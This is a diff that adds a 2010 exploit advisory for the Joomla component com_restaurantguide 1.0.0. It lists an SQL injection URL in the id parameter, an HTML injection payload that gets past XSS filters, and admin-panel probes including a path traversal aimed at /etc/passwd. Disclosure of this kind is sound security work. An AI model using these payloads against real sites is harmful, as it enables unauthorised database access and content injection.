@@ -1,0 +1,60 @@
+# Exploit Title: Joomla Component com_restaurantguide Multiple Vulnerabilities
+# Date: 18.09.2010
+# Author: Valentin
+# Category: webapps/0day
+# Version: 1.0.0
+
+# Tested on: Debian lenny, Apache2, MySQL 5, Joomla 1.5.x
+# CVE :  
+# Code : 
+
+
+[:::::::::::::::::::::::::::::::::::::: 0x1 ::::::::::::::::::::::::::::::::::::::]
+>> General Information 
+Advisory/Exploit Title = Joomla Component com_restaurantguide Multiple Vulnerabilities
+Author = Valentin Hoebel
+Contact = valentin@xenuser.org
+
+
+[:::::::::::::::::::::::::::::::::::::: 0x2 ::::::::::::::::::::::::::::::::::::::]
+>> Product information
+Name = Restaurant Guide
+Vendor = Oh-Taek Im
+Vendor Websites = http://www.photoindochina.com/, http://extensions.joomla.org/extensions/directory-a-documentation/thematic-directory/14054
+Affected Version(s) = 1.0.0
+
+ 
+[:::::::::::::::::::::::::::::::::::::: 0x3 ::::::::::::::::::::::::::::::::::::::]
+>> SQL Injection
+index.php?option=com_restaurantguide&view=country&id='&Itemid=69
+(id parameter is vulnerable)
+
+
+>> HTML/JS/VBS Code Injection (all input fields, also in the admin backend)
+It is possible to inject HTML/JS/VBS code into the document although XSS filters are active. Simply end the current HTML tag and convert your code into decimal HTMl code without semicolons:
+"><A HREF="http://www.google.com./">injected</A>
+(which is "><A HREF="http://www.google.com./">injected</A>)
+The code doesn't get parsed, so it is not possible to exploit this weakness. However, including arbitrary plain text into the current website is possible. Dangerous! :D
+
+
+>> Interesting stuff
+a) Triggering various error messages in the admin panel is possible, e.g.:
+administrator/index.php?option=com_restaurantguide&controller=restaurantitems&task=edit&cid[]=[try ' or -1 or an ID which does not exist]
+Sometimes the code of the component gets displayed within the browser window when you try to trigger errors with different variables.
+
+b) Playing around with the controller variable
+administrator/index.php?option=com_restaurantguide&controller=../../../../../../../../../etc/passwd%00
+(NOT a LFI vulnerability since the controller classes are defined in the source code, you just get different error messages.. nothing to exploit here..)
+
+
+[:::::::::::::::::::::::::::::::::::::: 0x4 ::::::::::::::::::::::::::::::::::::::]
+>> Additional Information
+Advisory/Exploit Published = 18.09.2010
+
+
+[:::::::::::::::::::::::::::::::::::::: 0x5 ::::::::::::::::::::::::::::::::::::::]
+>> Misc
+Greetz = cr4wl3r, JosS, packetstormsecurity.org
+
+
+[:::::::::::::::::::::::::::::::::::::: EOF ::::::::::::::::::::::::::::::::::::::]
